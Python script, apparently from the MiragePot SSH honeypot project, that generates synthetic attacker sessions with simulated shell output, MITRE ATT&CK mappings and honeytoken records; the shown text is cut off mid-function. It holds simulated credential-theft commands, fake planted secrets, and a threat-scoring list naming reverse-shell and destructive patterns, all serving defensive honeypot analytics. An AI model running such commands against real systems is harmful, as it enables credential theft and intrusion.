"""Sample data generator for MiragePot honeypot.

This script generates 10 realistic SSH honeypot sessions with complete data
including commands, TTP detections, honeytoken accesses, and attacker profiles.
The generated data matches the exact format that MiragePot's runtime produces,
allowing the Streamlit dashboard to display it without any code changes.

Usage:
    # Generate sample data (idempotent - overwrites existing)
    python scripts/generate_sample_data.py

    # Clean existing data and regenerate
    python scripts/generate_sample_data.py --clean

All data is reproducible using a fixed random seed (42).
"""

from __future__ import annotations

import argparse
import json
import random
import secrets
import shutil
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

# Fixed seed for reproducibility
random.seed(42)

# Path constants - match miragepot/server.py structure
SCRIPT_DIR = Path(__file__).resolve().parent
PROJECT_ROOT = SCRIPT_DIR.parent
DATA_DIR = PROJECT_ROOT / "data"
LOGS_DIR = DATA_DIR / "logs"
PROFILES_DIR = DATA_DIR / "profiles"


# ============================================================================
# Helper Functions - Session ID and Timestamps
# ============================================================================


def generate_session_id() -> str:
    """Generate a session ID matching MiragePot's format: session_{32_hex}."""
    return f"session_{secrets.token_hex(16)}"


def generate_start_time(days_ago: int) -> datetime:
    """Generate session start time in the 01:00-05:00 UTC window."""
    base = datetime.now(timezone.utc) - timedelta(days=days_ago)
    hour = random.randint(1, 5)
    minute = random.randint(0, 59)
    second = random.randint(0, 59)
    return base.replace(hour=hour, minute=minute, second=second, microsecond=0)


def format_timestamp(dt: datetime) -> str:
    """Format datetime as ISO string with Z suffix."""
    return dt.isoformat().replace("+00:00", "Z")


# ============================================================================
# Helper Functions - SSH Fingerprints
# ============================================================================


def generate_ssh_fingerprint(archetype: str) -> Dict[str, Any]:
    """Generate realistic SSH client fingerprint based on attacker archetype."""
    fingerprints = {
        "scanner": {
            "client_version": "SSH-2.0-libssh-0.9.6",
            "kex_algorithms": [
                "curve25519-sha256",
                "ecdh-sha2-nistp256",
                "diffie-hellman-group14-sha256",
            ],
            "ciphers": ["aes128-ctr", "aes192-ctr", "aes256-ctr"],
            "macs": ["hmac-sha2-256", "hmac-sha2-512", "hmac-sha1"],
            "compression": ["none"],
            "host_key_types": ["ssh-rsa", "ecdsa-sha2-nistp256"],
        },
        "sophisticated": {
            "client_version": "SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1",
            "kex_algorithms": [
                "curve25519-sha256",
                "curve25519-sha256@libssh.org",
                "ecdh-sha2-nistp256",
                "ecdh-sha2-nistp384",
                "ecdh-sha2-nistp521",
                "diffie-hellman-group-exchange-sha256",
                "diffie-hellman-group16-sha512",
            ],
            "ciphers": [
                "chacha20-poly1305@openssh.com",
                "aes128-ctr",
                "aes192-ctr",
                "aes256-ctr",
                "aes128-gcm@openssh.com",
                "aes256-gcm@openssh.com",
            ],
            "macs": [
                "umac-64-etm@openssh.com",
                "umac-128-etm@openssh.com",
                "hmac-sha2-256-etm@openssh.com",
                "hmac-sha2-512-etm@openssh.com",
            ],
            "compression": ["none", "zlib@openssh.com"],
            "host_key_types": [
                "ssh-ed25519",
                "ecdsa-sha2-nistp256",
                "rsa-sha2-512",
                "rsa-sha2-256",
                "ssh-rsa",
            ],
        },
        "automated": {
            "client_version": "SSH-2.0-paramiko_3.1.0",
            "kex_algorithms": [
                "ecdh-sha2-nistp256",
                "ecdh-sha2-nistp384",
                "ecdh-sha2-nistp521",
                "diffie-hellman-group14-sha256",
            ],
            "ciphers": ["aes128-ctr", "aes192-ctr", "aes256-ctr", "aes128-cbc"],
            "macs": ["hmac-sha2-256", "hmac-sha2-512", "hmac-sha1"],
            "compression": ["none"],
            "host_key_types": ["ssh-rsa", "ecdsa-sha2-nistp256", "ssh-ed25519"],
        },
        "bot": {
            "client_version": "SSH-2.0-Go",
            "kex_algorithms": [
                "curve25519-sha256@libssh.org",
                "ecdh-sha2-nistp256",
                "diffie-hellman-group14-sha1",
            ],
            "ciphers": ["aes128-ctr", "aes256-ctr"],
            "macs": ["hmac-sha2-256", "hmac-sha1"],
            "compression": ["none"],
            "host_key_types": ["ssh-rsa"],
        },
    }

    return fingerprints.get(archetype, fingerprints["automated"])


# ============================================================================
# Helper Functions - Authentication
# ============================================================================


def generate_auth_summary(
    username: str, password: str, failed_attempts: int = 0
) -> Dict[str, Any]:
    """Generate authentication summary with optional failed attempts."""
    attempts = []

    # Add failed attempts if specified
    for i in range(failed_attempts):
        attempts.append(
            {
                "method": "password",
                "username": username,
                "credential": f"wrong_pass_{i}",
                "success": False,
                "timestamp": format_timestamp(
                    datetime.now(timezone.utc)
                    - timedelta(seconds=(failed_attempts - i))
                ),
            }
        )

    # Add successful attempt
    attempts.append(
        {
            "method": "password",
            "username": username,
            "credential": password,
            "success": True,
            "timestamp": format_timestamp(datetime.now(timezone.utc)),
        }
    )

    return {
        "total_attempts": len(attempts),
        "successful_methods": ["password"],
        "failed_attempts": failed_attempts,
        "attempts": attempts,
    }


def generate_pty_info(archetype: str) -> Dict[str, Any]:
    """Generate PTY (terminal) information based on attacker type."""
    # Scripts and bots: smaller terminals
    # Interactive users: larger terminals
    dimensions = {
        "script_kiddie": (80, 24),
        "bot": (80, 24),
        "intermediate": (120, 40),
        "advanced": (180, 50),
    }

    width, height = dimensions.get(archetype, (80, 24))

    return {
        "term": "xterm-256color",
        "width": width,
        "height": height,
        "width_pixels": 0,
        "height_pixels": 0,
    }


# ============================================================================
# Helper Functions - Command Processing
# ============================================================================


def generate_command_response(command: str, cwd: str = "/root") -> str:
    """Generate realistic command output based on the command."""
    cmd_parts = command.split()
    if not cmd_parts:
        return ""

    cmd = cmd_parts[0]

    # Filesystem commands
    if cmd == "id":
        return "uid=0(root) gid=0(root) groups=0(root)\n"
    elif cmd == "whoami":
        return "root\n"
    elif cmd == "pwd":
        return f"{cwd}\n"
    elif cmd == "uname":
        if "-a" in cmd_parts:
            return "Linux miragepot 5.15.0-76-generic #83-Ubuntu SMP Thu Jun 15 19:16:32 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux\n"
        else:
            return "Linux\n"
    elif cmd == "hostname":
        return "miragepot\n"
    elif cmd == "w":
        return "  15:32:42 up 45 days,  3:21,  1 user,  load average: 0.15, 0.18, 0.12\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nroot     pts/0    192.168.1.100    15:30    0.00s  0.01s  0.00s w\n"
    elif cmd == "who":
        return "root     pts/0        2024-01-15 15:30 (192.168.1.100)\n"
    elif cmd == "last":
        return "root     pts/0        192.168.1.100    Mon Jan 15 15:30   still logged in\nroot     pts/0        192.168.1.50     Sun Jan 14 08:15 - 09:45  (01:30)\n\nwtmp begins Mon Jan  1 00:00:00 2024\n"
    elif cmd == "ls":
        if "/home" in command:
            return "admin\nubuntu\nuser\n"
        elif "/root/.ssh" in command:
            if "-la" in cmd_parts or "-al" in cmd_parts:
                return "total 12\ndrwx------ 2 root root 4096 Jan 10 10:23 .\ndrwx------ 5 root root 4096 Jan 15 15:30 ..\n-rw------- 1 root root 1675 Jan 10 10:23 id_rsa\n-rw-r--r-- 1 root root  398 Jan 10 10:23 id_rsa.pub\n-rw-r--r-- 1 root root  444 Jan 10 10:23 authorized_keys\n-rw-r--r-- 1 root root  222 Jan 10 10:23 known_hosts\n"
            else:
                return "authorized_keys\nid_rsa\nid_rsa.pub\nknown_hosts\n"
        elif "/var/www/html" in command:
            if "-la" in cmd_parts or "-al" in cmd_parts:
                return "total 28\ndrwxr-xr-x 2 www-data www-data 4096 Jan 12 14:22 .\ndrwxr-xr-x 3 root     root     4096 Jan 10 10:15 ..\n-rw-r--r-- 1 www-data www-data  156 Jan 12 14:22 .env\n-rw-r--r-- 1 www-data www-data  892 Jan 12 14:22 config.php\n-rw-r--r-- 1 www-data www-data 2048 Jan 12 14:22 index.php\n"
            else:
                return ".env\nconfig.php\nindex.php\n"
        else:
            return "Desktop\nDocuments\nDownloads\n"
    elif cmd == "cat":
        if "/etc/passwd" in command:
            return "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nadmin:x:1000:1000:Admin User:/home/admin:/bin/bash\nubuntu:x:1001:1001:Ubuntu User:/home/ubuntu:/bin/bash\n"
        elif "/etc/shadow" in command:
            return "cat: /etc/shadow: Permission denied\n"
        elif "/root/.aws/credentials" in command:
            return "[default]\naws_access_key_id = AKIAIOSFODNN7EXAMPLE\naws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\nregion = us-east-1\n"
        elif "/root/.ssh/id_rsa" in command:
            return "-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA1234567890abcdefghijklmnopqrstuvwxyz...\n[HONEYTOKEN - FAKE KEY DATA]\n...truncated for security...\n-----END RSA PRIVATE KEY-----\n"
        elif "/root/.ssh/authorized_keys" in command:
            return "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vK... root@miragepot\n"
        elif "/home/admin/.env" in command or "/var/www/html/.env" in command:
            return "DB_HOST=localhost\nDB_PORT=3306\nDB_DATABASE=production_db\nDB_USERNAME=db_admin\nDB_PASSWORD=Sup3rS3cr3t!\nJWT_SECRET=abc123faketoken\nSTRIPE_KEY=sk_live_FAKEKEY123\nAPI_KEY=ak_prod_1234567890\n"
        elif "/var/www/html/config.php" in command:
            return "<?php\n$db_host = 'localhost';\n$db_name = 'production_db';\n$db_user = 'db_admin';\n$db_password = 'Pr0dP@ssw0rd!';\n$api_key = 'FAKE_API_KEY_12345';\n?>\n"
        elif "/proc/cpuinfo" in command:
            return "processor\t: 0\nvendor_id\t: GenuineIntel\ncpu family\t: 6\nmodel\t\t: 142\nmodel name\t: Intel(R) Core(TM) i7-8550U CPU @ 1.80GHz\n"
        elif "/proc/meminfo" in command:
            return "MemTotal:        8052748 kB\nMemFree:         2156384 kB\nMemAvailable:    4892140 kB\nBuffers:          312456 kB\nCached:          2845632 kB\n"
        elif "/etc/os-release" in command:
            return 'NAME="Ubuntu"\nVERSION="20.04.6 LTS (Focal Fossa)"\nID=ubuntu\nID_LIKE=debian\nPRETTY_NAME="Ubuntu 20.04.6 LTS"\nVERSION_ID="20.04"\n'
        else:
            return f"cat: {cmd_parts[1] if len(cmd_parts) > 1 else 'file'}: No such file or directory\n"
    elif cmd == "df":
        if "-h" in cmd_parts:
            return "Filesystem      Size  Used Avail Use% Mounted on\n/dev/sda1        48G   22G   24G  48% /\ntmpfs           3.9G     0  3.9G   0% /dev/shm\n"
        else:
            return "Filesystem     1K-blocks    Used Available Use% Mounted on\n/dev/sda1       50331648 23068672  24674976  48% /\n"
    elif cmd == "ps":
        if "aux" in command:
            return "USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot         1  0.0  0.1 168548 11256 ?        Ss   Jan10   0:12 /sbin/init\nroot       124  0.0  0.0  16128  7244 ?        S<s  Jan10   0:00 /lib/systemd/systemd-journald\nroot       456  0.0  0.1  66028 12456 ?        Ss   Jan10   0:05 /usr/sbin/sshd -D\nroot      2341  0.0  0.0  12756  3456 pts/0    Ss   15:30   0:00 -bash\nroot      2398  0.0  0.0  13380  3128 pts/0    R+   15:32   0:00 ps aux\n"
        else:
            return "  PID TTY          TIME CMD\n 2341 pts/0    00:00:00 bash\n 2398 pts/0    00:00:00 ps\n"
    elif cmd == "netstat":
        if "-an" in command:
            return "Active Internet connections (servers and established)\nProto Recv-Q Send-Q Local Address           Foreign Address         State\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN\ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN\ntcp        0      0 192.168.1.10:22         192.168.1.100:52341     ESTABLISHED\n"
        else:
            return "Active Internet connections (w/o servers)\nProto Recv-Q Send-Q Local Address           Foreign Address         State\ntcp        0      0 miragepot:ssh           192.168.1.100:52341     ESTABLISHED\n"
    elif cmd == "ss":
        return "Netid  State    Recv-Q   Send-Q      Local Address:Port       Peer Address:Port   \ntcp    LISTEN   0        128               0.0.0.0:22              0.0.0.0:*\ntcp    ESTAB    0        0           192.168.1.10:22        192.168.1.100:52341\n"
    elif cmd == "ip":
        if "addr" in command:
            return "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN\n    inet 127.0.0.1/8 scope host lo\n2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP\n    inet 192.168.1.10/24 brd 192.168.1.255 scope global eth0\n"
        elif "route" in command:
            return "default via 192.168.1.1 dev eth0\n192.168.1.0/24 dev eth0 proto kernel scope link src 192.168.1.10\n"
        else:
            return ""
    elif cmd in ["wget", "curl"]:
        # Simulate download success
        return ""
    elif cmd == "chmod":
        return ""
    elif cmd == "mkdir":
        return ""
    elif cmd == "useradd":
        return ""
    elif cmd == "echo":
        return ""
    elif cmd == "crontab":
        if "-l" in cmd_parts:
            return "# m h  dom mon dow   command\n0 2 * * * /usr/bin/backup.sh\n"
        else:
            return ""
    elif cmd == "find":
        if ".php" in command:
            return "/var/www/html/index.php\n/var/www/html/config.php\n/var/www/html/admin.php\n"
        else:
            return "find: '/root': Permission denied\nfind: '/var/log': Permission denied\n"
    elif cmd == "for":
        return ""  # Loop output varies
    elif cmd == "unset":
        return ""
    elif cmd == "export":
        return ""
    elif cmd == "shred":
        return (
            "shred: /var/log/auth.log: failed to open for writing: Permission denied\n"
        )
    else:
        return ""


def calculate_threat_score(command: str) -> int:
    """Calculate threat score for a command (0-100)."""
    high_risk_patterns = [
        "shadow",
        "passwd",
        "wget",
        "curl",
        "rm -rf",
        "nc ",
        "bash -i",
        "authorized_keys",
        "crontab",
        "useradd",
        "chmod +x",
        "shred",
        "history -c",
        "unset HISTFILE",
        "aws",
        "credentials",
        "id_rsa",
        ".env",
        "config.php",
    ]

    command_lower = command.lower()
    score = 10  # Base score

    for pattern in high_risk_patterns:
        if pattern in command_lower:
            score += 20

    return min(score, 100)


def determine_tier(command: str) -> str:
    """Determine which tier handles this command."""
    cmd = command.split()[0] if command.split() else ""

    # Filesystem tier (builtin handlers)
    filesystem_commands = {
        "ls",
        "cd",
        "pwd",
        "cat",
        "whoami",
        "id",
        "uname",
        "w",
        "who",
        "last",
        "df",
        "ps",
        "hostname",
        "mkdir",
        "touch",
        "rm",
        "mv",
        "cp",
    }

    if cmd in filesystem_commands:
        return "filesystem"

    # LLM tier (complex/novel commands)
    llm_patterns = [
        "find",
        "netstat",
        "ss",
        "ip",
        "crontab",
        "useradd",
        "echo",
        "shred",
        "for ",
        "wget",
        "curl",
        "chmod",
        "export",
        "unset",
    ]

    for pattern in llm_patterns:
        if pattern in command:
            return "llm"

    # Cache tier (everything else)
    return "cache"


def extract_cwd(commands: List[str], default_cwd: str = "/root") -> str:
    """Extract current working directory from command sequence."""
    cwd = default_cwd
    for cmd in commands:
        if cmd.startswith("cd "):
            parts = cmd.split()
            if len(parts) > 1:
                target = parts[1]
                if target == "..":
                    cwd = "/".join(cwd.split("/")[:-1]) or "/"
                elif target.startswith("/"):
                    cwd = target
                else:
                    cwd = f"{cwd}/{target}".replace("//", "/")
    return cwd


def generate_command_entries(
    commands: List[str], start_time: datetime
) -> Tuple[List[Dict[str, Any]], datetime]:
    """Generate command entries with realistic timing and responses."""
    entries = []
    current_time = start_time
    current_cwd = "/root"

    for cmd in commands:
        # Calculate delay before this command
        if any(keyword in cmd for keyword in ["wget", "curl", "find"]):
            delay = random.uniform(5, 15)  # Thinking time
        else:
            delay = random.uniform(1, 8)  # Normal typing

        current_time += timedelta(seconds=delay)

        # Track cwd changes
        if cmd.startswith("cd "):
            parts = cmd.split()
            if len(parts) > 1:
                target = parts[1]
                if target == "..":
                    current_cwd = "/".join(current_cwd.split("/")[:-1]) or "/"
                elif target.startswith("/"):
                    current_cwd = target
                else:
                    current_cwd = f"{current_cwd}/{target}".replace("//", "/")

        entries.append(
            {
                "timestamp": format_timestamp(current_time),
                "command": cmd,
                "response": generate_command_response(cmd, current_cwd),
                "threat_score": calculate_threat_score(cmd),
                "delay_applied": round(random.uniform(0.05, 0.2), 3),
                "cwd": current_cwd,
            }
        )

    return entries, current_time


# ============================================================================
# Helper Functions - TTP Detection
# ============================================================================


def generate_ttp_indicators(
    commands: List[str], command_entries: List[Dict[str, Any]]
) -> List[Dict[str, Any]]:
    """Generate TTP indicators based on commands executed."""
    indicators = []

    # Build command->timestamp mapping
    cmd_timestamps = {entry["command"]: entry["timestamp"] for entry in command_entries}

    for cmd in commands:
        timestamp = cmd_timestamps.get(
            cmd, format_timestamp(datetime.now(timezone.utc))
        )

        # T1033 - System Owner/User Discovery
        if cmd in ["whoami", "id", "w", "who", "last"]:
            indicators.append(
                {
                    "technique_id": "T1033",
                    "technique_name": "System Owner/User Discovery",
                    "stage": "reconnaissance",
                    "confidence": "high",
                    "command": cmd,
                    "description": "Enumerated system users and current privileges",
                    "timestamp": timestamp,
                }
            )

        # T1082 - System Information Discovery
        elif (
            cmd.startswith("uname")
            or "proc/cpuinfo" in cmd
            or "proc/meminfo" in cmd
            or "/etc/os-release" in cmd
        ):
            indicators.append(
                {
                    "technique_id": "T1082",
                    "technique_name": "System Information Discovery",
                    "stage": "reconnaissance",
                    "confidence": "high",
                    "command": cmd,
                    "description": "Gathered system information (OS, kernel, hardware)",
                    "timestamp": timestamp,
                }
            )

        # T1083 - File and Directory Discovery
        elif cmd.startswith("ls") or cmd.startswith("find"):
            indicators.append(
                {
                    "technique_id": "T1083",
                    "technique_name": "File and Directory Discovery",
                    "stage": "reconnaissance",
                    "confidence": "high",
                    "command": cmd,
                    "description": "Enumerated files and directories",
                    "timestamp": timestamp,
                }
            )

        # T1003 - Credential Dumping
        elif "/etc/passwd" in cmd or "/etc/shadow" in cmd:
            indicators.append(
                {
                    "technique_id": "T1003",
                    "technique_name": "OS Credential Dumping",
                    "stage": "credential_access",
                    "confidence": "high",
                    "command": cmd,
                    "description": "Attempted to access system credential files",
                    "timestamp": timestamp,
                }
            )

        # T1552.001 - Credentials in Files
        elif any(
            pattern in cmd for pattern in [".env", "config.php", ".aws/credentials"]
        ):
            indicators.append(
                {
                    "technique_id": "T1552.001",
                    "technique_name": "Unsecured Credentials: Credentials In Files",
                    "stage": "credential_access",
                    "confidence": "high",
                    "command": cmd,
                    "description": "Accessed files containing credentials",
                    "timestamp": timestamp,
                }
            )

        # T1552.004 - Private Keys
        elif "id_rsa" in cmd or "authorized_keys" in cmd:
            indicators.append(
                {
                    "technique_id": "T1552.004",
                    "technique_name": "Unsecured Credentials: Private Keys",
                    "stage": "credential_access",
                    "confidence": "high",
                    "command": cmd,
                    "description": "Accessed SSH private keys",
                    "timestamp": timestamp,
                }
            )

        # T1049 - System Network Connections Discovery
        elif cmd.startswith("netstat") or cmd.startswith("ss"):
            indicators.append(
                {
                    "technique_id": "T1049",
                    "technique_name": "System Network Connections Discovery",
                    "stage": "reconnaissance",
                    "confidence": "high",
                    "command": cmd,
                    "description": "Enumerated network connections",
                    "timestamp": timestamp,
                }
            )

        # T1057 - Process Discovery
        elif "ps " in cmd or cmd == "ps":
            indicators.append(
                {
                    "technique_id": "T1057",
                    "technique_name": "Process Discovery",
                    "stage": "reconnaissance",
                    "confidence": "high",
                    "command": cmd,
                    "description": "Enumerated running processes",
                    "timestamp": timestamp,
                }
            )

        # T1016 - System Network Configuration Discovery
        elif cmd.startswith("ip "):
            indicators.append(
                {
                    "technique_id": "T1016",
                    "technique_name": "System Network Configuration Discovery",
                    "stage": "reconnaissance",
                    "confidence": "high",
                    "command": cmd,
                    "description": "Discovered network configuration",
                    "timestamp": timestamp,
                }
            )

        # T1018 - Remote System Discovery
        elif "ping" in cmd and "for " in cmd:
            indicators.append(
                {
                    "technique_id": "T1018",
                    "technique_name": "Remote System Discovery",
                    "stage": "reconnaissance",
                    "confidence": "high",
                    "command": cmd,
                    "description": "Scanned for other hosts on the network",
                    "timestamp": timestamp,
                }
            )

        # T1105 - Ingress Tool Transfer
        elif cmd.startswith("wget ") or cmd.startswith("curl "):
            if "http" in cmd:
                indicators.append(
                    {
                        "technique_id": "T1105",
                        "technique_name": "Ingress Tool Transfer",
                        "stage": "execution",
                        "confidence": "high",
                        "command": cmd,
                        "description": "Downloaded files from external source",
                        "timestamp": timestamp,
                    }
                )

        # T1059.004 - Unix Shell
        elif cmd.startswith("chmod +x") or (cmd.startswith("./") and ".sh" in cmd):
            indicators.append(
                {
                    "technique_id": "T1059.004",
                    "technique_name": "Command and Scripting Interpreter: Unix Shell",
                    "stage": "execution",
                    "confidence": "high",
                    "command": cmd,
                    "description": "Executed shell scripts or binaries",
                    "timestamp": timestamp,
                }
            )

        # T1136 - Create Account
        elif cmd.startswith("useradd"):
            indicators.append(
                {
                    "technique_id": "T1136",
                    "technique_name": "Create Account",
                    "stage": "persistence",
                    "confidence": "high",
                    "command": cmd,
                    "description": "Created new user account",
                    "timestamp": timestamp,
                }
            )

        # T1098 - Account Manipulation
        elif "chpasswd" in cmd:
            indicators.append(
                {
                    "technique_id": "T1098",
                    "technique_name": "Account Manipulation",
                    "stage": "persistence",
                    "confidence": "high",
                    "command": cmd,
                    "description": "Modified account password",
                    "timestamp": timestamp,
                }
            )

        # T1543 - Create or Modify System Process (cron)
        elif "crontab" in cmd and "|" in cmd:
            indicators.append(
                {
                    "technique_id": "T1543",
                    "technique_name": "Create or Modify System Process",
                    "stage": "persistence",
                    "confidence": "high",
                    "command": cmd,
                    "description": "Modified cron job for persistence",
                    "timestamp": timestamp,
                }
            )

        # T1070.003 - Clear Command History
        elif "unset HISTFILE" in cmd or "HISTSIZE=0" in cmd or "bash_history" in cmd:
            indicators.append(
                {
                    "technique_id": "T1070.003",
                    "technique_name": "Indicator Removal: Clear Command History",
                    "stage": "defense_evasion",
                    "confidence": "high",
                    "command": cmd,
                    "description": "Attempted to clear command history",
                    "timestamp": timestamp,
                }
            )

        # T1070.002 - Clear Linux Logs
        elif "shred" in cmd and "log" in cmd:
            indicators.append(
                {
                    "technique_id": "T1070.002",
                    "technique_name": "Indicator Removal: Clear Linux or Mac System Logs",
                    "stage": "defense_evasion",
                    "confidence": "high",
                    "command": cmd,
                    "description": "Attempted to destroy system logs",
                    "timestamp": timestamp,
                }
            )

        # T1505.003 - Web Shell
        elif "<?php" in cmd and "system" in cmd:
            indicators.append(
                {
                    "technique_id": "T1505.003",
                    "technique_name": "Server Software Component: Web Shell",
                    "stage": "persistence",
                    "confidence": "high",
                    "command": cmd,
                    "description": "Created web shell backdoor",
                    "timestamp": timestamp,
                }
            )

    return indicators


def generate_ttp_summary(indicators: List[Dict[str, Any]]) -> Dict[str, Any]:
    """Generate TTP summary from indicators."""
    if not indicators:
        return {
            "current_stage": "unknown",
            "stages_seen": [],
            "technique_count": 0,
            "total_indicators": 0,
            "risk_level": "low",
            "key_indicators": [],
            "recon_commands": 0,
            "credential_commands": 0,
            "persistence_commands": 0,
        }

    stages_seen = list(set(ind["stage"] for ind in indicators))
    technique_count = len(set(ind["technique_id"] for ind in indicators))

    # Determine current stage (most advanced)
    stage_order = [
        "reconnaissance",
        "credential_access",
        "execution",
        "persistence",
        "privilege_escalation",
        "defense_evasion",
        "lateral_movement",
        "collection",
        "exfiltration",
        "impact",
    ]
    current_stage = "reconnaissance"
    for stage in reversed(stage_order):
        if stage in stages_seen:
            current_stage = stage
            break

    # Calculate risk level
    high_confidence_count = sum(1 for ind in indicators if ind["confidence"] == "high")

    if (
        any(stage in stages_seen for stage in ["impact", "exfiltration"])
        or high_confidence_count >= 5
    ):
        risk_level = "critical"
    elif (
        any(
            stage in stages_seen
            for stage in ["persistence", "execution", "lateral_movement"]
        )
        or high_confidence_count >= 3
    ):
        risk_level = "high"
    elif len(stages_seen) >= 2 or high_confidence_count >= 1:
        risk_level = "medium"
    else:
        risk_level = "low"

    # Count by category
    recon_commands = sum(1 for ind in indicators if ind["stage"] == "reconnaissance")
    credential_commands = sum(
        1 for ind in indicators if ind["stage"] == "credential_access"
    )
    persistence_commands = sum(1 for ind in indicators if ind["stage"] == "persistence")

    return {
        "current_stage": current_stage,
        "stages_seen": stages_seen,
        "technique_count": technique_count,
        "total_indicators": len(indicators),
        "risk_level": risk_level,
        "key_indicators": indicators[:10],  # Top 10
        "recon_commands": recon_commands,
        "credential_commands": credential_commands,
        "persistence_commands": persistence_commands,
    }


# ============================================================================
# Helper Functions - Honeytokens
# ============================================================================


def generate_honeytoken_accesses(
    commands: List[str],
    honeytoken_files: List[str],
    command_entries: List[Dict[str, Any]],
) -> List[Dict[str, Any]]:
    """Generate honeytoken access records."""
    accesses = []

    # Build command->timestamp mapping
    cmd_timestamps = {entry["command"]: entry["timestamp"] for entry in command_entries}

    for cmd in commands:
        for honeytoken_path in honeytoken_files:
            if honeytoken_path in cmd:
                timestamp = cmd_timestamps.get(
                    cmd, format_timestamp(datetime.now(timezone.utc))
                )

                # Determine token type
                if "aws" in honeytoken_path:
                    token_type = "aws_credentials"
                elif "id_rsa" in honeytoken_path:
                    token_type = "ssh_private_key"
                elif ".env" in honeytoken_path:
                    token_type = "environment_variables"
                elif "config.php" in honeytoken_path:
                    token_type = "database_credentials"
                elif "shadow" in honeytoken_path:
                    token_type = "system_passwords"
                elif "authorized_keys" in honeytoken_path:
                    token_type = "ssh_authorized_keys"
                else:
                    token_type = "generic_credential"

                accesses.append(
                    {
                        "token_id": f"token_{abs(hash(honeytoken_path)) % 100000:05d}",
                        "token_type": token_type,
                        "file_path": honeytoken_path,
                        "access_time": timestamp,
                        "command": cmd,
                        "context": "read" if cmd.startswith("cat") else "accessed",
                    }
                )

    return accesses


def generate_honeytokens_summary(accesses: List[Dict[str, Any]]) -> Dict[str, Any]:
    """Generate honeytoken summary."""
    if not accesses:
        return {
            "total_tokens": 0,
            "total_accesses": 0,
            "unique_tokens_accessed": 0,
            "accessed_token_types": [],
            "exfiltration_attempts": 0,
            "high_risk": False,
        }

    unique_tokens = len(set(acc["token_id"] for acc in accesses))
    accessed_types = list(set(acc["token_type"] for acc in accesses))

    # Check for exfiltration (wget/curl after accessing honeytokens)
    exfil_attempts = sum(
        1
        for acc in accesses
        if any(
            keyword in acc["command"] for keyword in ["wget", "curl", "nc ", "base64"]
        )
    )

    return {
        "total_tokens": len(accesses),
        "total_accesses": len(accesses),
        "unique_tokens_accessed": unique_tokens,
        "accessed_token_types": accessed_types,
        "exfiltration_attempts": exfil_attempts,
        "high_risk": exfil_attempts > 0,
    }


# ============================================================================
# Helper Functions - Download Attempts
# ============================================================================


def generate_download_attempts(
    commands: List[str], command_entries: List[Dict[str, Any]]
) -> List[Dict[str, Any]]:
    """Generate download attempt records."""
    attempts = []

    # Build command->timestamp mapping
    cmd_timestamps = {entry["command"]: entry["timestamp"] for entry in command_entries}

    for cmd in commands:
        timestamp = cmd_timestamps.get(
            cmd, format_timestamp(datetime.now(timezone.utc))
        )

        if cmd.startswith("wget "):
            parts = cmd.split()
            url = next((p for p in parts if p.startswith("http")), None)
            if url:
                attempts.append(
                    {
                        "tool": "wget",
                        "source": url,
                        "destination": None,
                        "timestamp": timestamp,
                        "raw_command": cmd,
                        "flags": [p for p in parts if p.startswith("-")],
                        "method": None,
                    }
                )

        elif cmd.startswith("curl "):
            parts = cmd.split()
            url = next((p for p in parts if p.startswith("http")), None)
            if url:
                attempts.append(
                    {
                        "tool": "curl",
                        "source": url,
                        "destination": None,
                        "timestamp": timestamp,
                        "raw_command": cmd,
                        "flags": [p for p in parts if p.startswith("-")],
                        "method": "GET",
                    }
                )

    return attempts


# ============================================================================
# Helper Functions - Tier Usage
# ============================================================================


def calculate_tier_usage(commands: List[str]) -> Dict[str, int]:
    """Calculate tier usage breakdown."""
    usage = {"filesystem": 0, "cache": 0, "llm": 0}

    for cmd in commands:
        tier = determine_tier(cmd)
        usage[tier] += 1

    return usage


# ============================================================================
# Session Generators - All 10 Archetypes
# ============================================================================


def generate_session_1() -> Dict[str, Any]:
    """Session 1 - Quick Scanner (Script Kiddie)."""
    session_id = generate_session_id()
    start_time = generate_start_time(days_ago=7)

    commands = ["id", "whoami", "uname -a"]
    command_entries, end_time = generate_command_entries(commands, start_time)

    ttp_indicators = generate_ttp_indicators(commands, command_entries)
    ttp_summary = generate_ttp_summary(ttp_indicators)

    honeytoken_accesses: List[Dict[str, Any]] = []
    honeytokens_summary = generate_honeytokens_summary(honeytoken_accesses)

    download_attempts: List[Dict[str, Any]] = []

    return {
        "session_id": session_id,
        "attacker_ip": "185.220.101.45",
        "attacker_port": random.randint(32000, 65000),
        "login_time": format_timestamp(start_time),
        "logout_time": format_timestamp(end_time),
        "duration_seconds": round((end_time - start_time).total_seconds(), 2),
        "ssh_fingerprint": generate_ssh_fingerprint("scanner"),
        "auth": generate_auth_summary("root", "123456", failed_attempts=0),
        "pty_info": generate_pty_info("script_kiddie"),
        "commands": command_entries,
        "download_attempts": download_attempts,
        "ttp_summary": ttp_summary,
        "honeytokens_summary": honeytokens_summary,
    }


def generate_session_2() -> Dict[str, Any]:
    """Session 2 - Credential Harvester (Intermediate)."""
    session_id = generate_session_id()
    start_time = generate_start_time(days_ago=7)

    commands = [
        "whoami",
        "id",
        "cat /etc/passwd",
        "cat /etc/shadow",
        "cat /root/.ssh/authorized_keys",
        "cat /root/.aws/credentials",
        "cat /home/admin/.env",
    ]
    command_entries, end_time = generate_command_entries(commands, start_time)

    ttp_indicators = generate_ttp_indicators(commands, command_entries)
    ttp_summary = generate_ttp_summary(ttp_indicators)

    honeytoken_files = ["/root/.aws/credentials", "/home/admin/.env"]
    honeytoken_accesses = generate_honeytoken_accesses(
